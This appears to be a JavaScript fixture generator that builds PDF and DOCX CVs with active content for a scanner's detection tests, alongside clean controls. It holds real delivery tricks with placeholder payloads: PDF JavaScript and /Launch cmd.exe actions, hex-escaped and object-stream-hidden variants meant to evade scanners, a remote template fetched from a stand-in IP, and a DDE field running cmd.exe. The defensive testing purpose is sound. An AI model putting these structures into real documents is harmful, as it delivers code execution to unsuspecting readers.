// Builds small "dangerous" CV files for the active-content tests (no binaries in the repo).
import fs from "node:fs";
import path from "node:path";
import zlib from "node:zlib";
import { unzipSync, zipSync, strToU8, strFromU8 } from "fflate";

const FIX = path.join(path.dirname(new URL(import.meta.url).pathname), "fixtures");

/** A minimal valid PDF from object bodies (1-based), with a correct xref table. */
export function pdf(objects, { trailerExtra = "" } = {}) {
  let out = "%PDF-1.7\n%\xe2\xe3\xcf\xd3\n";
  const offsets = [];
  objects.forEach((body, i) => {
    offsets.push(Buffer.byteLength(out, "latin1"));
    out += `${i + 1} 0 obj\n${body}\nendobj\n`;
  });
  const xref = Buffer.byteLength(out, "latin1");
  out += `xref\n0 ${objects.length + 1}\n0000000000 65535 f \n` + offsets.map((o) => `${String(o).padStart(10, "0")} 00000 n \n`).join("");
  out += `trailer\n<< /Size ${objects.length + 1} /Root 1 0 R ${trailerExtra}>>\nstartxref\n${xref}\n%%EOF\n`;
  return Buffer.from(out, "latin1");
}

const page = ["<< /Type /Catalog /Pages 2 0 R >>", "<< /Type /Pages /Kids [3 0 R] /Count 1 >>", "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>"];

/** An object stream (compressed) holding `inner` as object 5. */
function objStm(inner) {
  const head = "5 0 ";
  const data = zlib.deflateSync(Buffer.from(head + inner, "latin1"));
  return Buffer.concat([Buffer.from(`<< /Type /ObjStm /N 1 /First ${head.length} /Filter /FlateDecode /Length ${data.length} >>\nstream\n`, "latin1"), data, Buffer.from("\nendstream", "latin1")]).toString("latin1");
}

function docx(edit) {
  const files = unzipSync(fs.readFileSync(path.join(FIX, "cv.docx")));
  edit(files);
  return Buffer.from(zipSync(files));
}

export const dangerous = {
  "pdf-javascript.pdf": () => pdf(["<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>", page[1], page[2], "<< /S /JavaScript /JS (app.alert\\(1\\)) >>"]),
  "pdf-hex-escaped.pdf": () => pdf(["<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>", page[1], page[2], "<< /S /J#61vaScr#69pt /J#53 (app.alert\\(1\\)) >>"]),
  "pdf-in-object-stream.pdf": () => pdf(["<< /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >>", page[1], page[2], objStm("<< /S /JavaScript /JS (app.alert\\(1\\)) >>")]),
  "pdf-launch.pdf": () => pdf(["<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>", page[1], page[2], "<< /S /Launch /F (cmd.exe) >>"]),
  "pdf-embedded-file.pdf": () => pdf([...page, "<< /Type /EmbeddedFile /Length 5 >>\nstream\nhello\nendstream"]),
  "docx-macros.docx": () => docx((f) => {
    f["word/vbaProject.bin"] = strToU8("fake vba");
    f["[Content_Types].xml"] = strToU8(strFromU8(f["[Content_Types].xml"]).replace("</Types>", '<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>'));
  }),
  "docx-remote-template.docx": () => docx((f) => {
    f["word/_rels/settings.xml.rels"] = strToU8('<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://203.0.113.9/t.dotm" TargetMode="External"/></Relationships>');
  }),
  "docx-dde.docx": () => docx((f) => {
    // Split across runs, as Word itself writes field codes.
    f["word/document.xml"] = strToU8(strFromU8(f["word/document.xml"]).replace("<w:body>", '<w:body><w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> DD</w:instrText></w:r><w:r><w:instrText>EAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc"</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>'));
  }),
  "docx-activex.docx": () => docx((f) => { f["word/activeX/activeX1.xml"] = strToU8("<ax/>"); }),
};

export const clean = {
  // Ordinary PDF features that must still pass: links, a benign object stream, a GoTo open action.
  "pdf-links-and-objstm.pdf": () => pdf(["<< /Type /Catalog /Pages 2 0 R /OpenAction [3 0 R /Fit] >>", page[1], "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Annots [5 0 R] >>", objStm("<< /Type /Annot /Subtype /Link /Rect [0 0 10 10] /A << /S /URI /URI (https://www.linkedin.com/in/someone) >> >>")]),
  "docx-with-hyperlink-field.docx": () => docx((f) => {
    f["word/document.xml"] = strToU8(strFromU8(f["word/document.xml"]).replace("<w:body>", '<w:body><w:p><w:fldSimple w:instr=" HYPERLINK &quot;https://example.com&quot; "><w:r><w:t>site</w:t></w:r></w:fldSimple></w:p>'));
  }),
};
